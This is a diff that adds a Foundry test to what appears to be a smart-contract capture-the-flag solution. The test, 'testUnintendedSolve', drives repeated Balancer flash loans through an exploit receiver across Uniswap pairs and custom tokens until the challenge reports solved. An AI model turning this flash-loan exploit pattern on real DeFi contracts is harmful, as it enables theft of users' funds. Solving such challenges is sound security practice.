@@ -104,6 +104,46 @@ contract Solve is Test{
         _balancer.flashloan(_flashLoanReceiver, _tokens, _amounts, _data);
     }
 
+        function testUnintendedSolve()public depositInWETH maketxs{
+        vm.roll(1e18);
+        IERC20[] memory _tokens=new IERC20[](1);
+        uint256[] memory _amounts=new uint256[](1);
+        _tokens[0]=IERC20(address(wETH9));
+        _amounts[0]=_liquidityAmount;
+        IUniswapV2Pair[] memory _unipairs=new IUniswapV2Pair[](3);
+        LamboToken[] memory _lamboTokens=new LamboToken[](3);
+        _lamboTokens[0]=lamboToken1;
+        _lamboTokens[1]=lamboToken2;
+        _lamboTokens[2]=lamboToken3;
+        _unipairs[0]=uniPair1;
+        _unipairs[1]=uniPair2;
+        _unipairs[2]=uniPair3;
+        address _player=makeAddr("PLAYER");
+        FlashLoanReceiver _flashLoanReceiver=new FlashLoanReceiver(_unipairs,
+                                                                    _lamboTokens,
+                                                                    whiteListed,
+                                                                    factory,
+                                                                    wETH9,
+                                                                    _balancer,
+                                                                    VSTETH,
+                                                                    _player
+                                                                );
+        bytes memory _data;
+        chall_Setup.setPlayer(_player);
+        _balancer.flashloan(_flashLoanReceiver, _tokens, _amounts, _data);
+        vm.expectRevert(abi.encodeWithSelector(Setup.Setup__Chall__Not__Solved.selector));
+        bool isSolved=chall_Setup.isSolved();
+        vm.roll(1e18+1);
+        _balancer.flashloan(_flashLoanReceiver, _tokens, _amounts, _data);
+        vm.expectRevert(abi.encodeWithSelector(Setup.Setup__Chall__Not__Solved.selector));
+        isSolved=chall_Setup.isSolved();
+        vm.roll(1e18+2);
+        _balancer.flashloan(_flashLoanReceiver, _tokens, _amounts, _data);
+        isSolved=chall_Setup.isSolved();
+        console.log(isSolved);
+    }
+
+
 }
 
 contract FlashLoanReceiver is IFlashLoanRecipient {
